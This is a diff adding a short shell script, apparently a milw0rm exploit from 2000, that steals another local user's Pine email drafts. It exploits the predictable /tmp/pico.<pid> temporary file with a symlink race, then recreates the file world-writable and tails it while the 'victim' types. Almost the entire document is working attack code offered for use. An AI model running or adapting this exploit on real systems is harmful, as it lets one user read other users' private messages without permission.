@@ -1,0 +1,48 @@
+#!/bin/sh
+# Grab local pine messages
+# Usage: ./mon_pine.sh <pid of pine process>
+# victim pine must use following settings
+#
+#  mat@hacksware.com
+#  http://hacksware.com
+#
+# [x]  enable-alternate-editor-cmd
+# [x]  enable-alternate-editor-implicitly
+# editor                   = /usr/bin/vi
+#
+
+PID=$1
+PICO_FILE=`printf "/tmp/pico.%.6d" $PID`
+TRASHCAN=/tmp/.trashcan.`date|sed "s/ //g"`
+echo PICO_FILE is $PICO_FILE
+
+#if $PICO_FILE and $TRASHCAN exists, remove them
+if test -f $PICO_FILE
+then
+ rm -f $PICO_FILE
+fi
+if test -f $TRASHCAN
+then
+ rm -f $TRASHCAN
+fi
+
+ln -s $TRASHCAN $PICO_FILE
+while :
+do
+ if test -f $TRASHCAN
+ then
+  break
+ fi
+done
+
+echo Victim is Editing Pine Message
+rm -f $PICO_FILE
+echo We replace temporary file
+touch $PICO_FILE
+chmod 777 $PICO_FILE
+echo "Get the message from "$PICO_FILE
+echo "^C to break tailer"
+tail -f $PICO_FILE
+
+
+# milw0rm.com [2000-12-15]
